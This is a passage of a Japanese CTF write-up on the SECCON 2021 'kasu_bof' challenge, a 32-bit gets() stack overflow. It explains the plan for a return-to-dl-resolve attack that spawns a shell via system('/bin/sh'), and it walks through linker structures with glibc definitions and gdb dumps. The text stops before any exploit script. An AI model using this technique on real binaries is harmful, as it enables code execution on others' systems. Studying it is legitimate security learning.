<!DOCTYPE html>
<html lang="ja-jp">

    <head><title>SECCON CTF 2021 - kasu_bof Writeup &ndash; Team Enu</title>
<meta name="description" content="Team EnuのWriteupや活動の紹介を掲載しています。">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="http://localhost:8080/css/palettes/base16-dark.css">
<link rel="stylesheet" href="http://localhost:8080/css/risotto.css">
<link rel="stylesheet" href="http://localhost:8080/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><h1 class="page__logo"><a href="http://localhost:8080" class="page__logo-inner">Team Enu</a></h1>
<nav class="page__nav main-nav">
    <ul>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/writeups/" title="">Writeups</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/news/" title="">News</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>SECCON CTF 2021 - kasu_bof Writeup</h1>
    </header>
    <div class="content__body">
        
<div id="outline-container-headline-1" class="outline-3">
<h3 id="headline-1">
問題
</h3>
<div id="outline-text-headline-1" class="outline-text-3">
<div id="outline-container-headline-2" class="outline-4">
<h4 id="headline-2">
問題文
</h4>
<div id="outline-text-headline-2" class="outline-text-4">
<pre class="example">
## Question
Do you understand return-to-dl-resolve attack on 32-bit?
</pre>
</div>
</div>
<div id="outline-container-headline-3" class="outline-4">
<h4 id="headline-3">
配布ファイル
</h4>
<div id="outline-text-headline-3" class="outline-text-4">
<ul>
<li><code>main.c</code></li>
<li><code>chall</code></li>
</ul>
<div id="outline-container-headline-4" class="outline-5">
<h5 id="headline-4">
<code>main.c</code>
</h5>
<div id="outline-text-headline-4" class="outline-text-5">
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
</span></span><span style="display:flex;"><span>      gets(buf);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-5" class="outline-5">
<h5 id="headline-5">
<code>chall</code>
</h5>
<div id="outline-text-headline-5" class="outline-text-5">
<pre class="example">
mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ file chall
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cb260735eeb00c173f7f530e9fae9ee3704e6c6f, for GNU/Linux 3.2.0, not stripped

mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
[*] &#39;/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre>
<ul>
<li>x86</li>
<li>SSP無効</li>
<li>Partial RELRO</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-6" class="outline-3">
<h3 id="headline-6">
方針
</h3>
<div id="outline-text-headline-6" class="outline-text-3">
<p>配布されたソースコード ( <code>main.c</code> )を見てみると、以下の特徴がある。</p>
<ul>
<li><code>buf</code> のサイズが <code>0x80</code> </li>
<li><code>gets</code> を使用しているため、 <code>buf</code> に任意の文字数を入力可能</li>
</ul>
<p>
このことから，配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる．</p>
<p>
また、問題文に <code>return to dl resolve</code> という攻撃方法を使用すれば良い旨のコメントがあるため，
スタックバッファオーバフローを利用して， <code>return to dl resolve</code> を用いて <code>shell</code> を起動できるとよさそうである．</p>
<p>
よって、この問題以下の方針で解いていく。</p>
<ol>
<li><strong>return to dl resolve</strong> を利用するため、 <code>.plt</code> セクションからライブラリ関数のアドレスが解決するまでの流れを調査</li>
<li>1.を踏まえて、 <strong>return to dl resolve</strong> を利用し、 <code>shell</code> を起動</li>
</ol>
</div>
</div>
<div id="outline-container-headline-7" class="outline-3">
<h3 id="headline-7">
1. return to dl resolve (ret2dl resolve)
</h3>
<div id="outline-text-headline-7" class="outline-text-3">
<p>return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である <code>_dl_runtime_resolve_xsavec</code> を利用し、任意のライブラリ関数を呼び出す攻撃手法である。</p>
<p>
   この攻撃の流れは以下のようになる。</p>
<ol>
<li>任意の関数(ここでは <code>shell</code> )を呼ぶため、 <code>_dl_runtime_resolve_xsavec</code> に読み込ませる偽の <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体、および  <code>system</code> 、 <code>/bin/sh</code> を書き込み可能な領域に用意</li>
<li><code>_dl_runtime_resolve_xsavec</code> が <code>Elf32_Rel</code> 構造体を特定するために引数に取る <code>reloc_arg</code> を、偽の <code>Elf32_Rel</code> を指すように指定</li>
<li><code>.plt</code> の先頭にジャンプし、偽の構造体を元に <code>system</code> のアドレスを解決し、 <code>system(&#34;/bin/sh&#34;)</code> を実行</li>
</ol>
<p>そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。</p>
<div id="outline-container-headline-8" class="outline-4">
<h4 id="headline-8">
<code>.plt</code> セクションからアドレス解決の流れ
</h4>
<div id="outline-text-headline-8" class="outline-text-4">
<p><code>.plt</code> セクションから、 <code>link_map</code> 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。</p>
<p>
    そこで、以下では、 <code>gets@plt</code> が呼び出されてから <code>gets</code> のシンボルが解決されるまでの流れを示す。</p>
<p>
    参考</p>
<pre class="example">
    .rel.plt                         .dynsym                                           .dynstr                                    
        |                                |                                                 |
        |                                |                                                 |
reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
        |                                |                                                 |
        +--&gt;|-----------+----------|     |                                                 |
            | Elf32_Rel | r_offset |     |                                                 |
            |           | r_info   |-----+  (r_info&gt;&gt;8 + .dynsym)*sizeof(Elf32_Sym)        |
            |-----------+----------|     |                                                 |
                                         |                                                 |
                                         +-&gt;|-----------+---------------------------|      |
                                            | Elf32_Sym | st_name                   |------+   st_name + .dynstr
                                            |           | st_value                  |      |
                                            |           | st_size                   |      |
                                            |           | st_info st_other st_shndx |      |
                                            |-----------+---------------------------|      |
                                                                                           |
                                                                                           +--&gt;|-----------+----------|
                                                                                               | symbol    |  &#39;gets&#39;  |
                                                                                               |-----------+----------|
</pre>
<div id="outline-container-headline-9" class="outline-5">
<h5 id="headline-9">
<code>link_map</code> 構造体
</h5>
<div id="outline-text-headline-9" class="outline-text-5">
<p><code>link_map</code> はELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス，再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。   </p>
<p>
   <code>plt</code> にジャンプする前に、 <code>link_map</code> 構造体のアドレス（GOTの2番目のエントリ）とGOTのオフセット ( <code>reloc_arg</code> )がスタックに格納される。</p>
<ul>
<li><a href="https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86">https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86</a></li>
</ul>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     members form a chain of all the shared objects loaded at startup.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     These data structures exist in space used by the run-time dynamic linker;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     modifying them may have disastrous results.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     This data structure might change in future, if necessary.  User-level
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     programs must avoid defining objects of this type.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> link_map
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* These first few members are part of the protocol with the debugger.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  This is the same format used in SVR4.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      ElfW(Addr) l_addr;		<span style="color:#75715e">/* Difference between the address in the ELF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">			      file and the addresses in memory.  */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>l_name;		<span style="color:#75715e">/* Absolute file name object was found in.  */</span>
</span></span><span style="display:flex;"><span>      ElfW(Dyn) <span style="color:#f92672">*</span>l_ld;		<span style="color:#75715e">/* Dynamic section of the shared object.  */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> link_map <span style="color:#f92672">*</span>l_next, <span style="color:#f92672">*</span>l_prev; <span style="color:#75715e">/* Chain of loaded objects.  */</span></span></span></code></pre></div>
</div>
<p>
     以下の例の場合， <code>link_map</code> 構造体のアドレス <code>0x804c004</code> と <code>gets</code> の <code>reloc_arg</code> <code>0x0</code> をスタックにプッシュしている。</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    gef➤  x/10i $eip
</span></span><span style="display:flex;"><span>    =&gt; 0x8049030:   push   DWORD PTR ds:0x804c004
</span></span><span style="display:flex;"><span>0x8049036:   jmp    DWORD PTR ds:0x804c008
</span></span><span style="display:flex;"><span>0x804903c:   add    BYTE PTR [eax],al
</span></span><span style="display:flex;"><span>0x804903e:   add    BYTE PTR [eax],al
</span></span><span style="display:flex;"><span>0x8049040 &lt;gets@plt&gt;:        jmp    DWORD PTR ds:0x804c00c
</span></span><span style="display:flex;"><span>0x8049046 &lt;gets@plt+6&gt;:      push   0x0
</span></span><span style="display:flex;"><span>0x804904b &lt;gets@plt+11&gt;:     jmp    0x8049030
</span></span><span style="display:flex;"><span>0x8049050 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804c010
</span></span><span style="display:flex;"><span>0x8049056 &lt;__libc_start_main@plt+6&gt;: push   0x8
</span></span><span style="display:flex;"><span>0x804905b &lt;__libc_start_main@plt+11&gt;:        jmp    0x8049030</span></span></code></pre></div>
</div>
<p>
   以下のサイトを参考に、gdbで、ELFの構造体を読み込めるようにする。</p>
<ul>
<li>
<p><a href="https://inaz2.hatenablog.com/entry/2014/07/21/124857">https://inaz2.hatenablog.com/entry/2014/07/21/124857</a></p>
<ul>
<li>
<p>gdbに <code>link.h</code> および <code>elf.h</code> のシンボル情報を読み込み</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gcc -g -fno-eliminate-unused-debug-types -x c -m32 -c /usr/include/link.h -o link.o</span></span></code></pre></div>
</div>
<p>今回はx86のELFを対象としているため <code>-m32</code> オプションを指定</p>
</li>
</ul>
</li>
</ul>
<p>特定した <code>link_map</code> 構造体のアドレス <code>0xf7ffd990</code> の中身を表示してみる。</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  add-symbol-file link.o 0
</span></span><span style="display:flex;"><span>add symbol table from file &#34;link.o&#34; at
</span></span><span style="display:flex;"><span>.text_addr = 0x0
</span></span><span style="display:flex;"><span>Reading symbols from link.o...
</span></span><span style="display:flex;"><span>gef➤  set $l = (struct link_map *) 0xf7ffd990
</span></span><span style="display:flex;"><span>gef➤  print *$l
</span></span><span style="display:flex;"><span>$1 = {
</span></span><span style="display:flex;"><span> l_addr = 0x0,
</span></span><span style="display:flex;"><span> l_name = 0xf7ffdc84 &#34;&#34;,
</span></span><span style="display:flex;"><span> l_ld = 0x804bf14,
</span></span><span style="display:flex;"><span> l_next = 0xf7ffdc90,
</span></span><span style="display:flex;"><span> l_prev = 0x0
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-10" class="outline-5">
<h5 id="headline-10">
<code>.dynamic</code> セクション
</h5>
<div id="outline-text-headline-10" class="outline-text-5">
<p><code>.dynamic</code> セクションのアドレスは， <code>link_map</code> 構造体の <code>l_ld</code> に格納されるため、
  <code>.dynamic</code> セクションのアドレスは <code>0x804bf14</code> であるとわかる。</p>
<p>
  <code>.dynamic</code> セクションは， <code>ELF_Dyn</code> 構造体のエントリを <code>d_tag</code> の種類の数保持しており、この中に <code>.rel.plt</code> や <code>.dynsym</code> , <code>.dynstr</code> などのアドレスが格納されている。</p>
<ul>
<li>
<p>ELF_Dyn 構造体</p>
<ul>
<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838</a></li>
</ul>
</li>
</ul>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Dynamic section entry.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf32_Sword d_tag;			<span style="color:#75715e">/* Dynamic entry type */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>	Elf32_Word d_val;			<span style="color:#75715e">/* Integer value */</span>
</span></span><span style="display:flex;"><span>	Elf32_Addr d_ptr;			<span style="color:#75715e">/* Address value */</span>
</span></span><span style="display:flex;"><span>      } d_un;
</span></span><span style="display:flex;"><span>  } Elf32_Dyn;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf64_Sxword d_tag;			<span style="color:#75715e">/* Dynamic entry type */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>	Elf64_Xword d_val;		<span style="color:#75715e">/* Integer value */</span>
</span></span><span style="display:flex;"><span>	Elf64_Addr d_ptr;			<span style="color:#75715e">/* Address value */</span>
</span></span><span style="display:flex;"><span>      } d_un;
</span></span><span style="display:flex;"><span>  } Elf64_Dyn;</span></span></code></pre></div>
</div>
<ul>
<li>
<p>d_tagの定義</p>
<ul>
<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860</a></li>
</ul>
</li>
</ul>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...</span></span></code></pre></div>
</div>
<p>
    また、このとき <code>.dynamic</code> セクションは， <code>d_tag</code> の順番に並んでいる訳ではないことに注意。</p>
<ul>
<li>
<p>以下の例では， <code>DT_STRTAB, DT_SYMTAB</code> は8，9番目のエントリ， <code>DT_JMPREL, DT_REL</code> は16，17番目のエントリに配置</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0x0804bf14│+0x0000   &lt;_DYNAMIC+0000&gt; 0x00000001
</span></span><span style="display:flex;"><span>0x0804bf18│+0x0004   &lt;_DYNAMIC+0004&gt; 0x00000001
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x0804bf54│+0x0040   &lt;_DYNAMIC+0040&gt; 0x00000005 // DT_STRTAB
</span></span><span style="display:flex;"><span>0x0804bf58│+0x0044   &lt;_DYNAMIC+0044&gt; 0x0804825c
</span></span><span style="display:flex;"><span>0x0804bf5c│+0x0048   &lt;_DYNAMIC+0048&gt; 0x00000006 // DT_SYMTAB
</span></span><span style="display:flex;"><span>0x0804bf60│+0x004c   &lt;_DYNAMIC+004c&gt; 0x0804820c
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x0804bf94│+0x0080   &lt;_DYNAMIC+0080&gt; 0x00000017 // DT_JMPREL
</span></span><span style="display:flex;"><span>0x0804bf98│+0x0084   &lt;_DYNAMIC+0084&gt; 0x080482d8
</span></span><span style="display:flex;"><span>0x0804bf9c│+0x0088   &lt;_DYNAMIC+0088&gt; 0x00000011 // DT_REL
</span></span><span style="display:flex;"><span>0x0804bfa0│+0x008c   &lt;_DYNAMIC+008c&gt; 0x080482d0
</span></span><span style="display:flex;"><span>...</span></span></code></pre></div>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-headline-11" class="outline-5">
<h5 id="headline-11">
<code>.rel.plt</code> セクション
</h5>
<div id="outline-text-headline-11" class="outline-text-5">
<p><code>rel.plt</code> セクションは， <code>ELF_Rel</code> 構造体の配列となっている。</p>
<ul>
<li>
<p>ELF_Rel 構造体</p>
<ul>
<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632</a></li>
</ul>
</li>
</ul>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Relocation table entry without addend (in section of type SHT_REL).  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf32_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
</span></span><span style="display:flex;"><span>    Elf32_Word	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>  } Elf32_Rel;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* I have seen two different definitions of the Elf64_Rel and
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Elf64_Rela structures, so we&#39;ll leave them out until Novell (or
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     whoever) gets their act together.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf64_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
</span></span><span style="display:flex;"><span>    Elf64_Xword	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>  } Elf64_Rel;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf32_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
</span></span><span style="display:flex;"><span>    Elf32_Word	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>    Elf32_Sword r_addend;		<span style="color:#75715e">/* Addend */</span>
</span></span><span style="display:flex;"><span>  } Elf32_Rela;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf64_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
</span></span><span style="display:flex;"><span>    Elf64_Xword r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>    Elf64_Sxword r_addend;		<span style="color:#75715e">/* Addend */</span>
</span></span><span style="display:flex;"><span>  } Elf64_Rela;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* RELR relocation table entry */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> Elf32_Word	Elf32_Relr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> Elf64_Xword	Elf64_Relr;</span></span></code></pre></div>
</div>
<p>
     <code>.dynamic</code> セクションから取得した <code>.rel.plt</code> のアドレス先をgdbでダンプしてみる。</p>
<ul>
<li><code>reloc_arg</code> が <code>.rel.plt</code> のインデックス</li>
</ul>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  ser $reloc_arg = 0x0
</span></span><span style="display:flex;"><span>  gef➤  set $reloc = &amp;((Elf32_Rel *)($l.l_ld[16].d_un.d_ptr))[$reloc_arg]
</span></span><span style="display:flex;"><span>  gef➤  print *$reloc
</span></span><span style="display:flex;"><span>  $10 = {
</span></span><span style="display:flex;"><span>      r_offset = 0x804c00c,
</span></span><span style="display:flex;"><span>      r_info = 0x107
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gef➤  dd 0x080482d8
</span></span><span style="display:flex;"><span>  0x080482d8│+0x0000   0x0804c00c // getsのGOTエントリ (reloc_arg = 0x0)
</span></span><span style="display:flex;"><span>  0x080482dc│+0x0004   0x00000107
</span></span><span style="display:flex;"><span>  0x080482e0│+0x0008   0x0804c010 // __libc_start_mainのGOTエントリ (reloc_arg = 0x1)
</span></span><span style="display:flex;"><span>  0x080482e4│+0x000c   0x00000307
</span></span><span style="display:flex;"><span>  0x080482e8│+0x0010   0x00000000
</span></span><span style="display:flex;"><span>  0x080482ec│+0x0014   0x00000000</span></span></code></pre></div>
</div>
<p>
    <code>r_info</code> は，シンボルを解決するために使用される。
    <code>r_info</code> を 8 byte 右シフトすることにより， <code>dynsym</code> のインデックスを取得することができる。</p>
<ul>
<li>
<p><code>r_info</code> の定義</p>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_SYM(i)			((i) &gt;&gt; 32)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_TYPE(i)		((i) &amp; 0xffffffff)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span></span></code></pre></div>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-headline-12" class="outline-5">
<h5 id="headline-12">
<code>.dynsym</code> セクション
</h5>
<div id="outline-text-headline-12" class="outline-text-5">
<p><code>.dynsym</code> セクションは， <code>Elf_Sym</code> 構造体の配列となっている。</p>
<ul>
<li>ELF_Sym 構造体</li>
</ul>
<ul>
<li>
<p><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517</a></p>
<div class="src src-c">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Symbol table entry.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf32_Word	st_name;		<span style="color:#75715e">/* Symbol name (string tbl index) */</span>
</span></span><span style="display:flex;"><span>    Elf32_Addr	st_value;		<span style="color:#75715e">/* Symbol value */</span>
</span></span><span style="display:flex;"><span>    Elf32_Word	st_size;		<span style="color:#75715e">/* Symbol size */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info;		<span style="color:#75715e">/* Symbol type and binding */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other;		<span style="color:#75715e">/* Symbol visibility */</span>
</span></span><span style="display:flex;"><span>    Elf32_Section st_shndx;		<span style="color:#75715e">/* Section index */</span>
</span></span><span style="display:flex;"><span>  } Elf32_Sym;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Elf64_Word	st_name;		<span style="color:#75715e">/* Symbol name (string tbl index) */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info;		<span style="color:#75715e">/* Symbol type and binding */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other;		<span style="color:#75715e">/* Symbol visibility */</span>
</span></span><span style="display:flex;"><span>    Elf64_Section st_shndx;		<span style="color:#75715e">/* Section index */</span>
</span></span><span style="display:flex;"><span>    Elf64_Addr	st_value;		<span style="color:#75715e">/* Symbol value */</span>
</span></span><span style="display:flex;"><span>    Elf64_Xword st_size;		<span style="color:#75715e">/* Symbol size */</span>
</span></span><span style="display:flex;"><span>  } Elf64_Sym;</span></span></code></pre></div>
</div>
<ul>
<li>
<p><code>st_name</code> は，実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセット
<code>r_info</code> からインデックスを計算し、 <code>Elf32_Sym</code> のアドレスを特定してみる。</p>
<div class="src src-text">
